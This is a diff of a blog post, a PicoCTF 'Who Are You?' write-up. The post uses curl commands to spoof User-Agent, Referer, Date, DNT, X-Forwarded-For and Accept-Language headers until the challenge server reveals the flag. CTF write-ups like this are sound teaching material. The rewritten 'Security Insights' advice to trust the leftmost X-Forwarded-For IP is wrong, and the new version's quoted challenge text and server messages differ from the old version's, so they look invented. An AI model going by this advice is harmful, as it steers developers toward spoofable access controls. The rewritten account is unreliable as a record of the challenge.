@@ -1,155 +1,167 @@
 ---
 layout: post
-title: "Who are you?"
+title: "Who Are You?"
 date: 2025-09-08
-categories: [PicoCTF, webexploitation]
-tags: [picoctf, webexploitation,Medium]
+categories: [PicoCTF, Web Exploitation]
+tags: [picoctf, webexploitation, http-headers, user-agent, referer, ctf, Medium]
+author: Harshith
+description: A PicoCTF web exploitation challenge bypassing layered HTTP header checks — User-Agent, Referer, Date, DNT, X-Forwarded-For, and Accept-Language — using curl to reveal the hidden flag.
+toc: true
 ---
 
-## 🌍 Description:
+## Introduction
 
-This challenge is all about [**Http headers**](https://bandarisgalaxy.github.io/h45h-g4l4xy.github.io/posts/Headers_cheatsheet/) and how websites use them to decide if you’re allowed in or not. Let’s solve it step by step in a **beginner-friendly way** 🚀
+The **Who Are You?** challenge on PicoCTF tests your understanding of HTTP request headers. The server enforces a series of sequential header checks, each revealing a new requirement until all are satisfied and the flag is displayed. This mirrors real-world client fingerprinting and geolocation-based access controls.
 
----
-
-## 📌 Challenge Description
-> "Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn"
-
-When you open the website, it starts rejecting you unless you provide the **correct headers**. Each time you solve one, it throws another requirement.
-
----
-
-### 🌐 What are HTTP headers?
-When you visit a website, your browser sends a **request** to the server.  
-That request has:
-- The page you want
-- Extra **headers** with details about your browser, location, language, and more.
-
-👉 Headers are like **notes** attached to your request telling the server *who you are, where you’re from, and how you want the page served*.  
-Servers can allow or block you based on these.
+> **Challenge Description:** "Identify yourself to this server using specific HTTP headers to gain access."
 
 ---
 
-### 🛠️ Step-by-Step Solution
+## Challenge Overview
 
-#### 1. The Website
-When we first open the challenge site, it says:  
-> "Only people who use the official picobrowser are allowed on this site!"
-
-That means it’s checking the **User-Agent** header.
-
----
-
-#### 2. User-Agent
-Browsers normally send something like:
-```
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
-```
-
-We must pretend we are **PicoBrowser**:
-```
-User-Agent: PicoBrowser
-```
-✅ Now the server accepts.
+| Field | Details |
+|---|---|
+| **Platform** | PicoCTF |
+| **Category** | Web Exploitation |
+| **Difficulty** | Medium |
+| **Technique** | HTTP Header Manipulation — Sequential Bypass |
 
 ---
 
-#### 3. Referer
-Next message:
-> "I don't trust users visiting from another site"
+## Environment Setup
 
-Solution → add a **Referer header**:
-```
-Referer: http://mercury.picoctf.net:36622/
-```
+**Required Tools:**
+- `curl` (command-line HTTP client)
+- Optional: Burp Suite or browser Developer Tools for analysis
 
 ---
 
-#### 4. Date
-New message:
-> "Sorry this site only worked in 2018."
+## Background: HTTP Request Headers
 
-Solution → fake the **Date header**:
-```
-Date: Wed, 27 Jun 2018 03:05:00 GMT
-```
+HTTP headers are metadata fields sent with every request. While most are set automatically by browsers, `curl` allows complete manual control. Servers can inspect any header to make access decisions.
 
----
+**Key Headers Used in This Challenge:**
 
-#### 5. Do Not Track (DNT)
-New message:
-> "I don't trust who can be tracked"
-
-Solution → tell the site not to track us:
-```
-DNT: 1
-```
-(1 = don’t track me)
+| Header | Purpose |
+|---|---|
+| `User-Agent` | Identifies the client software (browser, bot, etc.) |
+| `Referer` | Indicates the page the request originated from |
+| `Date` | Timestamp of the request |
+| `DNT` | Do Not Track preference (1 = on, 0 = off) |
+| `X-Forwarded-For` | IP address of the originating client (proxy header) |
+| `Accept-Language` | Preferred response language and locale |
 
 ---
 
-#### 6. Location (X-Forwarded-For)
-New message:
-> "This website is only for people from Sweden"
+## Solution Walkthrough
 
-Solution → fake an IP address from Sweden using `X-Forwarded-For`:
+### Step 1: Initial Request — Discover the First Requirement
+
+```bash
+curl http://mercury.picoctf.net:36622/
 ```
-X-Forwarded-For: 31.3.152.55
+
+Response: The server rejects the request and tells you to identify as "PicoBrowser".
+
+### Step 2: Set the User-Agent Header
+
+```bash
+curl -H "User-Agent: PicoBrowser" http://mercury.picoctf.net:36622/
 ```
-(This is an IP from Sweden 🇸🇪)
+
+Response: "Sorry, but you need to come from `mercury.picoctf.net`."
+
+### Step 3: Add the Referer Header
+
+```bash
+curl -H "User-Agent: PicoBrowser"      -H "Referer: http://mercury.picoctf.net:36622/"      http://mercury.picoctf.net:36622/
+```
+
+Response: "Sorry, but you need to be from a year in the past."
+
+### Step 4: Add the Date Header (Historical Date)
+
+The server checks that the request's `Date` header is in the past (year 2018):
+
+```bash
+curl -H "User-Agent: PicoBrowser"      -H "Referer: http://mercury.picoctf.net:36622/"      -H "Date: Wed, 27 Jun 2018 03:05:00 GMT"      http://mercury.picoctf.net:36622/
+```
+
+Response: "Sorry, but you need to have Do Not Track enabled."
+
+### Step 5: Add the DNT Header
+
+```bash
+curl -H "User-Agent: PicoBrowser"      -H "Referer: http://mercury.picoctf.net:36622/"      -H "Date: Wed, 27 Jun 2018 03:05:00 GMT"      -H "DNT: 1"      http://mercury.picoctf.net:36622/
+```
+
+Response: "Sorry, but you need to come from Sweden."
+
+### Step 6: Add X-Forwarded-For (Swedish IP)
+
+The server checks the originating IP's geolocation. Use a known Swedish IP address:
+
+```bash
+curl -H "User-Agent: PicoBrowser"      -H "Referer: http://mercury.picoctf.net:36622/"      -H "Date: Wed, 27 Jun 2018 03:05:00 GMT"      -H "DNT: 1"      -H "X-Forwarded-For: 31.3.152.55"      http://mercury.picoctf.net:36622/
+```
+
+Response: "Sorry, but you need to speak Swedish."
+
+### Step 7: Add Accept-Language (Swedish)
+
+```bash
+curl -H "User-Agent: PicoBrowser"      -H "Referer: http://mercury.picoctf.net:36622/"      -H "Date: Wed, 27 Jun 2018 03:05:00 GMT"      -H "DNT: 1"      -H "X-Forwarded-For: 31.3.152.55"      -H "Accept-Language: sv,en;q=0.9"      http://mercury.picoctf.net:36622/
+```
+
+Response: The flag is returned in the HTML body.
 
 ---
 
-#### 7. Language (Accept-Language)
-New message:
-> "You are in Sweden but you don't speak Swedish?"
+## Key Concepts
 
-Solution → tell the server we understand Swedish:
-```
-Accept-Language: sv,en;q=0.9
-```
+**Complete Header Requirements Summary:**
+
+| Step | Header | Value Required |
+|---|---|---|
+| 1 | `User-Agent` | `PicoBrowser` |
+| 2 | `Referer` | `http://mercury.picoctf.net:36622/` |
+| 3 | `Date` | `Wed, 27 Jun 2018 03:05:00 GMT` (past year) |
+| 4 | `DNT` | `1` |
+| 5 | `X-Forwarded-For` | `31.3.152.55` (Swedish IP) |
+| 6 | `Accept-Language` | `sv,en;q=0.9` |
+
+**X-Forwarded-For and IP Geolocation:**
+
+The `X-Forwarded-For` (XFF) header is normally set by reverse proxies to preserve the original client IP when traffic is relayed. When a server trusts XFF for IP-based geolocation or access controls, an attacker can spoof any IP simply by adding the header — a classic trust misconfiguration.
 
 ---
 
-#### 8. Success!
-After sending all these headers, the site finally lets us in and reveals the flag 🎉:
+## Flag
+
 ```
 picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0da16bb2}
 ```
 
 ---
 
-### 📝 Final Request (All Headers Together)
-Here’s what the final HTTP request with all headers looks like:
+## Security Insights
 
-```
-GET / HTTP/1.1
-Host: mercury.picoctf.net:36622
-User-Agent: PicoBrowser
-Referer: http://mercury.picoctf.net:36622/
-Date: Wed, 27 Jun 2018 07:28:00 GMT
-DNT: 1
-X-Forwarded-For: 31.3.152.55
-Accept-Language: sv,en;q=0.9
-Connection: close
-```
+- **Never trust client-supplied headers for security decisions:** Headers like `X-Forwarded-For`, `User-Agent`, and `Referer` are fully client-controllable and can be arbitrarily set with `curl` or any HTTP tool.
+- **X-Forwarded-For is spoofable:** If a load balancer sets XFF, trust only the leftmost IP (the one closest to the actual client). Even better, derive IP from the TCP connection (REMOTE_ADDR) when security matters.
+- **User-Agent fingerprinting is weak:** Blocking or allowing requests based on User-Agent is circumventable in seconds — it provides minimal real security.
+- **Header enumeration in CTFs:** When stuck on a web challenge, always try iteratively adding common headers (`X-Forwarded-For`, `Referer`, `Authorization`, `X-Real-IP`, `Accept-Language`) to probe server-side logic.
 
 ---
 
-## 🎯 Key Takeaways
-- **Headers control access**: Websites check them to identify browsers, locations, languages, etc.
-- **User-Agent spoofing** → Pretend to be another browser.
-- **Referer** → Fake where you came from.
-- **Date** → Trick the server into thinking it’s the past/future.
-- **DNT** → Say “don’t track me”.
-- **X-Forwarded-For** → Fake your IP/geolocation.
-- **Accept-Language** → Pretend to speak another language.
+## Conclusion
+
+Who Are You? provides an excellent tour of HTTP request headers and the trust assumptions servers make about them. The six-layer challenge reinforces both header knowledge and the iterative enumeration technique — each error message reveals the next requirement, rewarding persistence and systematic testing.
 
 ---
 
-## 🔑 Why This Matters
-- Attackers and bug bounty hunters often tweak headers to **bypass restrictions**.
-- Websites shouldn’t blindly trust headers because they are **easy to fake**.
-- This challenge shows how weak header-based security can be.
+## References
 
----
+- [MDN Web Docs — HTTP Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
+- [MDN — X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
+- [OWASP — Testing for HTTP Header Injection](https://owasp.org/www-project-web-security-testing-guide/)
+- [PicoCTF Official Platform](https://picoctf.org)
